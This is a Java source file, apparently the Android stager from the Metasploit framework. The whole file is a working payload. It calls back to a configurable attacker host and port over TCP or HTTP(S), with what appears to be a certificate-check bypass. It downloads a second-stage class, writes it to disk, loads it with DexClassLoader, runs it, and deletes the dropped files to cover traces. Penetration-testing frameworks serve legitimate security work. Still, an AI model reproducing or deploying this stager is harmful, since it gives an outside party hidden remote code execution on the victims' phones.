package com.metasploit.stage;

import android.content.Context;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.TimeUnit;

import dalvik.system.DexClassLoader;

public class Payload {

    public static final String URL =            "ZZZZ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ";
    public static final String CERT_HASH =      "WWWW                                        ";
    public static final String LHOST =          "XXXX127.0.0.1                       ";
    public static final String LPORT =          "YYYY4444                            ";
    public static final String RETRY_TOTAL =    "TTTT                                ";
    public static final String RETRY_WAIT =     "SSSS                                ";

    public static long retry_total;
    public static long retry_wait;

    private static String[] parameters;

    public static void start(Context context) {
        startInPath(context.getFilesDir().toString());
    }

    public static void startAsync() {
        new Thread() {
            @Override
            public void run() {
                // Execute the payload
                Payload.main(null);
            }
        }.start();
    }

    public static void startInPath(String path) {
        parameters = new String[]{path};
        startAsync();
    }

    public static void main(String[] args) {
        if (args != null) {
            File currentDir = new File(".");
            String path = currentDir.getAbsolutePath();
            parameters = new String[]{path};
        }
        int retryTotal;
        int retryWait;
        try {
            retryTotal = Integer.parseInt(RETRY_TOTAL.substring(4).trim());
            retryWait = Integer.parseInt(RETRY_WAIT.substring(4).trim());
        } catch (NumberFormatException e) {
            return;
        }

        long payloadStart = System.currentTimeMillis();
        retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
        retry_wait = TimeUnit.SECONDS.toMillis(retryWait);

        while (System.currentTimeMillis() < payloadStart + retry_total) {
            try {
                if (URL.substring(4).trim().length() == 0) {
                    reverseTCP();
                } else {
                    reverseHTTP();
                }
                return;
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                Thread.sleep(retry_wait);
            } catch (InterruptedException e) {
                return;
            }
        }
    }

    private static void reverseHTTP() throws Exception {
        String lurl = URL.substring(4).trim();
        InputStream inStream;
        if (lurl.startsWith("https")) {
            URLConnection uc = new URL(lurl).openConnection();
            Class.forName("com.metasploit.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, uc);
            inStream = uc.getInputStream();
        } else {
            inStream = new URL(lurl).openStream();
        }
        OutputStream out = new ByteArrayOutputStream();
        DataInputStream in = new DataInputStream(inStream);
        loadStage(in, out, parameters);
    }

    private static void reverseTCP() throws Exception {
        String lhost = LHOST.substring(4).trim();
        String lport = LPORT.substring(4).trim();
        Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
        DataInputStream in = new DataInputStream(msgsock.getInputStream());
        OutputStream out = new DataOutputStream(msgsock.getOutputStream());
        loadStage(in, out, parameters);
    }

    private static void loadStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        String path = parameters[0];
        String filePath = path + File.separatorChar + "payload.jar";
        String dexPath = path + File.separatorChar + "payload.dex";

        // Read the class name
        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);
        String classFile = new String(core);

        // Read the stage
        coreLen = in.readInt();
        core = new byte[coreLen];
        in.readFully(core);

        File file = new File(filePath);
        if (!file.exists()) {
            file.createNewFile();
        }
        FileOutputStream fop = new FileOutputStream(file);
        fop.write(core);
        fop.flush();
        fop.close();

        // Load the stage
        DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
                Payload.class.getClassLoader());
        Class<?> myClass = classLoader.loadClass(classFile);
        final Object stage = myClass.newInstance();
        file.delete();
        new File(dexPath).delete();
        myClass.getMethod("start",
                new Class[]{DataInputStream.class, OutputStream.class, String[].class})
                .invoke(stage, in, out, parameters);
    }
}
